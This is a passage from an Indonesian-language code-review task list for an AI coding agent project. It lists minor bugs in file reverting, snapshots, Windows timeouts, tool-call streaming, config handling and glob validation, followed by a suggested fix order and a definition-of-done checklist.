- **Fix:** perlakukan baris `+`/`-`/spasi tanpa `@@` di awal sebagai satu chunk implisit. Parse hunk menjadi **urutan operasi** (konteks/hapus/tambah) dan terapkan berurutan pada posisi ditemukan, bukan mengumpulkan `removes`/`adds` global. Untuk chunk hanya-tambah dengan hint: sisipkan setelah baris hint (atau setelah `context_before`). Buat penerapan per-file **atomik**: kalau ada chunk yang gagal, tulis **nol** perubahan untuk file itu dan laporkan jelas. Cek `is_file_read`/`file_changed_since_read` untuk `Update`/`Delete`.

---

## P2 — Kecil

1. **`FileTracker.record_write`** saat file dihapus lalu dibuat ulang: `kind` menjadi `created` tetapi `before` lama tertinggal, sehingga `/revert` **menghapus** file alih-alih memulihkan isi asli. Reset `before` sesuai urutan operasi, atau simpan riwayat per operasi.
2. **`FileTracker.revert`** memakai `p.write_text(change.before)`: encoding default lokal dan `surrogateescape` dari `read_text_preserve` bisa memicu `UnicodeEncodeError`. Pakai `write_text_preserve`. Tambahkan cek konflik bila file diubah pengguna setelah agent (jangan menimpa diam-diam).
3. **Snapshot hanya formalitas**: `SnapshotManager.revert_to_git` tidak memulihkan apa pun, hanya mencetak "Use `git checkout <hash>`" (dan itu tidak memulihkan perubahan uncommitted). Implementasikan snapshot nyata (mis. `git stash create` / `write-tree` dengan index sementara, disimpan di `refs/vallen/snap-<id>`) atau ubah deskripsi fitur agar jujur. `_run` juga tidak membunuh proses saat timeout, dan parsing `git status --porcelain` salah untuk nama file berspasi/rename.
4. **Windows:** `os.killpg`/`getpgid` tidak ada. Timeout `shell` melempar `AttributeError` (tidak tertangkap `except (ProcessLookupError, OSError)`) dan proses dibiarkan hidup. README mengklaim dukungan Windows. Beri cabang Windows (`taskkill /T /F` atau `CTRL_BREAK_EVENT`) dan bash vs `cmd.exe` yang jelas.
5. **Shell tool:** deteksi sudo memakai substring `"sudo "` (positif palsu untuk `echo "sudo "`); janji "terminal interaktif akan terbuka otomatis" perlu dipastikan benar.
6. **`read` gambar:** hasil tool bertipe list (blok `image_url`) dikirim dengan `role: tool`. OpenAI tidak menerima gambar di pesan `tool` (hanya teks). Pindahkan gambar ke pesan `user` sesudah tool result untuk provider yang tidak mendukung.
7. **Tool call streaming:** sebagian provider (mis. mode kompatibel Gemini) mengirim beberapa tool call paralel dengan `index` sama atau tanpa `id`. Saat `id` baru muncul berbeda dari entri yang sedang dirakit, mulai entri baru.
8. **`_parse_frontmatter`** memakai `content.index("---", 3)`, sehingga `---` di tengah nilai memutus frontmatter. Cari baris yang **hanya** berisi `---`.
9. **Dead code:** `handle_length_truncation`, `check_doom_loop` (sebagian), dan beberapa import di `agent.py` diduplikasi inline. Satukan supaya perbaikan tidak terlewat di salah satu salinan.
10. **`MODEL_CONTEXT_LIMITS`:** `llama` = 32k terlalu rendah untuk Llama 3.1+ (128k) sehingga kompaksi terlalu dini. Model baru (gpt-5, gpt-6, o-series, qwen, kimi, glm) jatuh ke default 128k. Izinkan override per-model di config dan gunakan `context_length` dari `/models` bila tersedia.
11. **`.vallennext_launcher.sh`** berisi path hardcoded ke mesin pengembang (`/home/vallenganteng/Destop/...`). Jangan di-commit, atau hasilkan saat instalasi.
12. **`MCP add_server`/`remove_server`:** pada layout lama (`[mcp.<nama>]` tanpa `servers`), `servers` adalah `mcp_sec` itu sendiri lalu di-set ke `mcp_sec["servers"]` → struktur melingkar → `toml.dumps` `RecursionError`. Salin dict sebelum menyimpan.
13. **`Config.get`** mengembalikan `default` yang sama pada tiap tingkat kunci hilang. Aman untuk kasus sekarang, tetapi rapuh bila `default` berupa dict yang dimutasi pemanggil. Kembalikan salinan.
14. **DB:** tiap panggilan membuka koneksi baru + `PRAGMA journal_mode=WAL`; `add_message` membuka dua koneksi. Pakai satu koneksi/pool dan tutup eksplisit (`contextlib.closing`) untuk menghindari `ResourceWarning`.
15. **Glob:** pola dengan `..` atau path absolut diproses `Path.glob` di luar root. Saat ini tertahan tidak sengaja oleh `relative_to`. Validasi pola secara eksplisit.

---

## Urutan pengerjaan yang disarankan

1. R2-P0-4 (`apply_patch` Add File `+`, overwrite, move-same) dan R2-P1-1 (read-cache basi). Dua ini paling sering dialami pengguna biasa.
2. R2-P0-1, R2-P0-2, R2-P0-3 (keamanan).
3. R2-P0-5 bersama P0-3/P1-2/P1-3 ronde 1 (invarian tool-call & cancel).
4. R2-P1-10, R2-P1-12 (input dibajak, custom command).
5. R2-P1-13 (MCP), R2-P1-5/6 (timeout, 429), R2-P1-8 (subagent).
6. Sisanya.

## Definition of Done

- [ ] Semua P0 selesai dan bertes hijau.
- [ ] Semua P1 selesai (atau dilewati dengan alasan tertulis untuk item 🔎 yang tidak terbukti).
- [ ] `pytest tests/` tanpa kegagalan baru dibanding baseline.
- [ ] Tidak ada `tool_call_id` tanpa result / result ganda pada skenario cancel, retry, path di luar workspace, dan subagent.
- [ ] Ringkasan akhir: file yang diubah, perubahan perilaku yang terlihat pengguna (mis. `Add File` menolak menimpa, format otomatis jadi opt-in, MCP default ASK, `run` headless memakai sesi baru), dan item yang dilewati beserta alasannya.
